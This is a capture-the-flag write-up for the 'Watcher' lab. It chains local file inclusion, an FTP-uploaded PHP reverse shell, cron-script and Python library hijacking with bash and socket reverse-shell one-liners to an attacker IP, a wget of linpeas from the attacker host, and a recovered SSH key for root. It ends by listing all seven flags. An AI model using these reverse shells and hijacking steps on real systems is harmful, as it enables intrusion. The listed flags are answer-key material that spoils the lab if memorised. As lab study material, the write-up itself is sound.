# Watcher - Medium

```shell
rustscan -a 10.10.39.151 --range 0-65535 --ulimit 5000 -- -sV

ftp 10.10.39.151
#anonymous login not allowed

feroxbuster -u http://10.10.39.151 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

ftp 10.10.39.151
#login as ftpuser

#put reverse-shell.php in ftp /files

#setup listener
nc -nvlp 4444
#get reverse shell after LFI
id

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /var/www/html

ls -la

cd more_secrets_a9f10a

ls -la

cat flag_3.txt

sudo -l
#we can run all commands as toby

sudo -u toby bash -i

cd

ls -la

cat flag_4.txt
#check other files in directory

cat jobs/cow.sh

cat /etc/crontab

echo '#!/bin/bash
/bin/bash -i >& /dev/tcp/10.14.31.212/5555 0>&1' > cow.sh

#in attacker machine
nc -nvlp 5555
#reverse shell as mat

cat flag_5.txt

#check note.txt

cd scripts

cat cmd.py

cat will_script.py

sudo -l

#python library hijacking
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.31.212",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> cmd.py

#setup listener
nc -nvlp 7777

#run will_script as will
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py id

#we get reverse shell as will
cd /home/will

cat flag_6.txt

#get linpeas.sh from python server on attacker machine
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

cat /opt/backups/key.b64
#decode from base64 to get private key

#in attacker machine
#copy private key to file
vim id_rsa

chmod 600 id_rsa

ssh root@10.10.0.173 -i id_rsa

cat /root/flag_7.txt
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29 (Ubuntu)

We can check ftp anonymous login, but that's not allowed.

We can check the website and enumerate its directories as well using feroxbuster.

The website contains a few images and some text.

Enumerated directories include:

  * /flag_1.txt
  * /images
  * /post.php
  * /css
  * /robots.txt

/robots.txt includes /flag_1.txt (flag 1) and /secret_file_do_not_read.txt

Now, we are not allowed access to /secret_file_do_not_read.txt

However, in the webpage, at /post.php there are a few links which include the 'post' parameter, and they lead to other pages; this is an example of LFI.

Using the same pattern we can navigate to the following page to read the secret file:

    /post.php?post=secret_file_do_not_read.txt

This includes ftp creds ftpuser:givemefiles777, by a user 'Will' and the location is /home/ftpuser/ftp/files

Logging into ftp, we can get our 2nd flag.

As we are given a location for ftp files, we can upload our PHP reverse shell to the location using ftp, then visit that link with RCE via LFI.

After adding our reverse-shell in /files in ftp, we need to visit the link:

    /post.php?post=../../../home/ftpuser/ftp/files/reverse-shell.php

This gives us reverse-shell as www-data; we can find flag 3 in a secret folder in /var/www/html

'sudo -l' shows that we can run all commands as 'toby'; so we can get a shell as toby.

Flag 4 can be found in toby's home directory.

There's a note file which mentions cron jobs.

The script, cow.sh, runs every minute by user 'mat' and moreover, it can be edited by us; we will add one-liner for reverse shell.

The script runs in a while, and we get shell as user mat on our listener in attacker machine.

Flag 5 can be found in mat's home directory; we have a note here as well.

We have two scripts - cmd.py and will_script.py - but only will_script.py can be run as will.

Using python library hijacking, we can modify cmd.py which is being called in will_script.py, and add a reverse-shell one-liner to it.

We get a reverse shell on our listener in attacker machine, after we run will_script.py as will using sudo.

We get reverse shell as will, and flag 6 can be found in will's home directory.

For privesc, we can use linpeas.sh

Using linpeas, we get to know that there is a key file in /opt/backups, which is encoded in base64.

Decoding it gives us a private key, we can use it to login via SSH as root.

We can find flag 7 in root directory.
```

1. Flag 1 - FLAG{robots_dot_text_what_is_next}

2. Flag 2 - FLAG{ftp_you_and_me}

3. Flag 3 - FLAG{lfi_what_a_guy}

4. Flag 4 - FLAG{chad_lifestyle}

5. Flag 5 - FLAG{live_by_the_cow_die_by_the_cow}

6. Flag 6 - FLAG{but_i_thought_my_script_was_secure}

7. Flag 7 - FLAG{who_watches_the_watchers}
